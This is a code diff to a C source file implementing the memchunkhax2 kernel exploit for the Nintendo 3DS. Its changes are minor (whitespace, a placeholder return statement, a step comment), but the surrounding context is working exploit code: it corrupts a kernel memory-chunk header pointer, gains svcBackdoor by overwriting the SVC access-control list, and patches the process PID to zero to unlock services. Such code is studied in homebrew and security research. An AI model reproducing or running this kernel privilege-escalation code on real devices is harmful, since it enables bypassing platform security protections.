@@ -87,7 +87,7 @@ static void km_stage1() {
     sprintf(DEBUGBUF_NEXT, "thread pageend at %p\n", thread_pageend);
     u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
     memset(thread_page, 0xFF, SVC_ACL_SIZE);
-    
+
     // Running this code means we have svcBackdoor, and we should tell the main function we ran.
     // There's no easy way to directly return a value through this exploit, so pass it on globally.
     exploitStage = 1;
@@ -97,11 +97,11 @@ static void km_stage1() {
 static s32 kmbackdoor_pid_zero(void) {
     // Turn interrupts off
     __asm__ volatile("cpsid aif");
-    
+
     originalPid = km_get_process_pid();
     sprintf(DEBUGBUF_NEXT, "old pid is %lu\n", originalPid);
     km_patch_process_pid(0);
-    
+
     // We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
     return 0;
 }
@@ -109,7 +109,7 @@ static s32 kmbackdoor_pid_zero(void) {
 // Reset the process PID to what it was. Unsure if this has any real impact.
 static s32 kmbackdoor_pid_reset(void) {
     __asm__ volatile("cpsid aif");
-    
+
     km_patch_process_pid(originalPid);
 
     // Back to normal.
@@ -146,12 +146,15 @@ static Result __attribute__((naked)) svcCreateEventKAddr(Handle* event, u8 reset
             "str r1, [r3]\n"
             "bx lr"
     );
+    //Add a return statement just to make the compiler happy; it should never get here.
+    return (Result)0;
+
 }
 
 // Executes exploit.
 static u8 memchunkhax2_exploit() {
     printf("Setting up firm=%ld kernel=%ld\n", osGetFirmVersion(), osGetKernelVersion());
-    
+
     // Set up variables.
     Handle arbiter = __sync_get_arbiter();
     AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
@@ -162,7 +165,7 @@ static u8 memchunkhax2_exploit() {
     Handle kObjHandle = 0;
     u32 kObjAddr = 0;
     Thread delayThread = NULL;
-    
+
     if(data == NULL) {
         printf("Failed to create allocate data.\n");
         goto cleanup;
@@ -191,7 +194,7 @@ static u8 memchunkhax2_exploit() {
         printf("Failed to allow threads on core 1.\n");
         goto cleanup;
     }
-    
+
     // Figure out if this is a N3DS so that we can use the right KProcess offsets later.
     APT_CheckNew3DS(&isNew3DS);
     printf("System type: %s\n", isNew3DS ? "New" : "Old");
@@ -252,6 +255,7 @@ static u8 memchunkhax2_exploit() {
     while((u32) svcArbitrateAddress(arbiter, data->addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
 
     // Overwrite the header "next" pointer to our crafted MemChunkHdr within our kernel object.
+    // Step 3
     ((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;
 
     // Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
@@ -323,7 +327,7 @@ cleanup:
     if(vtable != NULL) {
         linearFree(vtable);
     }
-    
+
     // We assume success if the exploitStage was successfully modified by the initial execution.
     return exploitStage >= 1;
 }
@@ -342,7 +346,7 @@ static u8 memchunkhax2_service_unlock() {
 
     svcBackdoor(kmbackdoor_pid_reset);
     debugbuf_out();
-    
+
     return 1;
 }
 
